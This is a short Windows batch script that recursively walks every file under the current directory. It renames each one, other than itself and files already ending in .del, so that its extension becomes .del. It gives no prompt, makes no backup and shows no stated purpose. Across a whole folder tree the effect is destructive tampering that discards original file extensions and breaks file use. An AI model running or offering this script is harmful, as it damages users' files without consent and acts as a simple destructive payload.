@echo off
setlocal enabledelayedexpansion



 

set "SELF=%~f0"



for /R %%F in (*) do (

if exist "%%F" (

 

if not "%%F"=="%SELF%" (

if not "%%~xF"==".del" (

ren "%%F" "%%~nF.del"

)

)

)

)


 